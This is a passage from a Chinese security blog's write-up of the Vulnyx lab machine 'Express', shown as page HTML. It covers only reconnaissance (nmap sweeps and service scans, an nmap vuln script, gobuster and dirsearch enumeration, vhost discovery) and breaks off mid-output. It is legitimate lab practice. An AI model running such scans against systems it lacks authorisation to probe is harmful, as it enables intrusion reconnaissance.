<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/e3722a685bf8da82.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e3722a685bf8da82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c63903712a141bbb.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-bb6c42847cbf8692.js" defer=""></script><script src="/_next/static/rBOAoH_mNY0kmuqb3_RcF/_buildManifest.js" defer=""></script><script src="/_next/static/rBOAoH_mNY0kmuqb3_RcF/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnyxExpress","contentHtml":"\u003ch1\u003eExpress\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eDifficulty: \u003cstrong\u003eMedium\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e36\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  nmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 08:02 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00031\u003c/span\u003es latency).\nMAC Address: 0A:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00027\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:D5:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e82\u003c/span\u003e (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.35\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00040\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:E5:B6:EC (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00061\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:C4:D6 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  nmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 08:06 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00050\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:C4:D6 (Oracle VirtualBox virtual NIC)\n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.87\u003c/span\u003e secon\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 08:07 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00054\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e9.2\u003c/span\u003ep1 Debian \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e+deb12u3 (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n| ssh-hostkey: \n|   \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e65\u003c/span\u003e:bb:ae:ef:\u003cspan class=\"hljs-number\"\u003e71\u003c/span\u003e:d4:b5:c5:8f:e7:ee:dc:0b:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:c2 (ECDSA)\n|_  \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e ea:c8:da:c8:\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e71\u003c/span\u003e:d8:8e:08:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:c0:\u003cspan class=\"hljs-number\"\u003e66\u003c/span\u003e:e0:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e49\u003c/span\u003e (ED25519)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.62\u003c/span\u003e ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.62\u003c/span\u003e (Debian)\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:C4:D6 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e5.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0.54\u003c/span\u003e ms \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15.35\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-less\"\u003e⚡ \u003cspan class=\"hljs-selector-tag\"\u003eroot\u003c/span\u003e@\u003cspan class=\"hljs-selector-tag\"\u003ekali\u003c/span\u003e  ~/\u003cspan class=\"hljs-selector-tag\"\u003eDesktop\u003c/span\u003e/\u003cspan class=\"hljs-selector-tag\"\u003etest\u003c/span\u003e/\u003cspan class=\"hljs-selector-tag\"\u003etest\u003c/span\u003e  \u003cspan class=\"hljs-selector-tag\"\u003enmap\u003c/span\u003e \u003cspan class=\"hljs-selector-tag\"\u003e-script\u003c/span\u003e=\u003cspan class=\"hljs-selector-tag\"\u003evuln\u003c/span\u003e \u003cspan class=\"hljs-selector-tag\"\u003e-p\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-selector-class\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-selector-class\"\u003e.36\u003c/span\u003e\n\u003cspan class=\"hljs-selector-tag\"\u003eStarting\u003c/span\u003e \u003cspan class=\"hljs-selector-tag\"\u003eNmap\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e7.94S\u003c/span\u003e\u003cspan class=\"hljs-selector-tag\"\u003eVN\u003c/span\u003e ( \u003cspan class=\"hljs-attribute\"\u003ehttps\u003c/span\u003e:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2025-02-21 08:09 EST\u003c/span\u003e\nPre-scan script \u003cspan class=\"hljs-attribute\"\u003eresults\u003c/span\u003e:\n| \u003cspan class=\"hljs-attribute\"\u003ebroadcast-avahi-dos\u003c/span\u003e:\n|   Discovered \u003cspan class=\"hljs-attribute\"\u003ehosts\u003c/span\u003e:\n|     \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.251\u003c/span\u003e\n|   After NULL UDP avahi packet DoS (CVE-\u003cspan class=\"hljs-number\"\u003e2011\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e).\n|_  Hosts are all up (\u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e vulnerable).\nNmap scan report for \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.36\u003c/span\u003e\nHost is up (\u003cspan class=\"hljs-number\"\u003e0.00057s\u003c/span\u003e latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\n|\u003cspan class=\"hljs-attribute\"\u003e_http-stored-xss\u003c/span\u003e: Couldn't find any stored XSS vulnerabilities.\n|\u003cspan class=\"hljs-attribute\"\u003e_http-csrf\u003c/span\u003e: Couldn't find any CSRF vulnerabilities.\n|\u003cspan class=\"hljs-attribute\"\u003e_http-dombased-xss\u003c/span\u003e: Couldn't find any DOM based XSS.\nMAC \u003cspan class=\"hljs-attribute\"\u003eAddress\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e:\u003cspan class=\"hljs-attribute\"\u003eC4\u003c/span\u003e:D6 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-attribute\"\u003edone\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned in \u003cspan class=\"hljs-number\"\u003e61.78\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没扫描出扫描漏洞，优先级\u003ccode\u003e80\u003c/code\u003e\u003e\u003ccode\u003e22\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e服务，并检测指纹，默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没信息，先扫描一下目录，耶？也没什么信息耶\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -b \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e502\u003c/span\u003e --no-error -x \u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt,html,php,asp  \n===============================================================\nGobuster v3\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e\n[+] Method:                  GET\n[+] Threads:                 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt\n[+] Negative Status codes:   \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e502\u003c/span\u003e\n[+] User Agent:              gobuster/\u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e\n[+] Extensions:              asp,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt,html,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/index.html           (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e10701\u003c/span\u003e]\n/javascript           (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e319\u003c/span\u003e] [--\u003e http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.36\u003c/span\u003e/javascript/]\nProgress: \u003cspan class=\"hljs-number\"\u003e1323360\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e1323366\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e一点信息没有，最后得知作者并没有提示我们域名，但是可以在\u003ccode\u003evulnyx\u003c/code\u003e的规则上找到\u003ca href=\"https://vulnyx.com/rules/\"\u003ehttps://vulnyx.com/rules/\u003c/a\u003e ，那么域名应该就是\u003ccode\u003eexpress.nyx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e添加到\u003ccode\u003ehosts\u003c/code\u003e ，再次访问就可以访问到了 。PS：wow~还带霉霉玩\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxExpress/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么目录扫描和漏洞扫描都要重新来过了\u003c/p\u003e\n\u003cp\u003e两个\u003ccode\u003ejavascript\u003c/code\u003e文件夹 不对劲\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-swift\"\u003e\u003cspan class=\"hljs-operator\"\u003e⚡\u003c/span\u003e root\u003cspan class=\"hljs-meta\"\u003e@kali\u003c/span\u003e  \u003cspan class=\"hljs-operator\"\u003e~/\u003c/span\u003e\u003cspan class=\"hljs-type\"\u003eDesktop\u003c/span\u003e\u003cspan class=\"hljs-regexp\"\u003e/test/\u003c/span\u003eexpress  dirsearch \u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003eu http:\u003cspan class=\"hljs-comment\"\u003e//express.nyx -x 403,404 -e php,zip,txt\u003c/span\u003e\n\u003cspan class=\"hljs-regexp\"\u003e/usr/\u003c/span\u003elib\u003cspan class=\"hljs-regexp\"\u003e/python3/\u003c/span\u003edist\u003cspan class=\"hljs-operator\"\u003e-\u003c/span\u003epackages\u003cspan class=\"hljs-regexp\"\u003e/dirsearch/\u003c/span\u003edirsearch.py:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e: \u003cspan class=\"hljs-type\"\u003eDeprecationWarning\u003c/span\u003e: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an \u003cspan class=\"hljs-type\"\u003eAPI\u003c/span\u003e. \u003cspan class=\"hljs-type\"\u003eSee\u003c/span\u003e https:\u003cspan class=\"hljs-comment\"\u003e//setuptools.pypa.io/en/latest/pkg_resources.html\u003c/span\u003e\n  from pkg_resources \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e DistributionNotFound, VersionConflict\n\n  \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e|\u003c/span\u003e. \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e  \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e  \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e  \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e\u003cspan class=\"hljs-operator\"\u003e|\u003c/span\u003e\u003cspan class=\"hljs-keyword\"\u003e_\u003c/span\u003e    v0.\u003cspan 